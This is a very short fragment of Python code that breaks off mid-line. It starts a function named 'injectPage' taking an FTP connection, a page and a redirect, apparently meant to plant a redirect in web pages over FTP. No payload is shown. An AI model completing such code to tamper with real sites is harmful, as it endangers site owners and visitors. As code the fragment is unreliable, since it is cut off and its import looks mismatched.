import pyftpdlib
def injectPage(ftp,page,redirect):
    f=open(page+'.tmp','w')
    ftp.retrline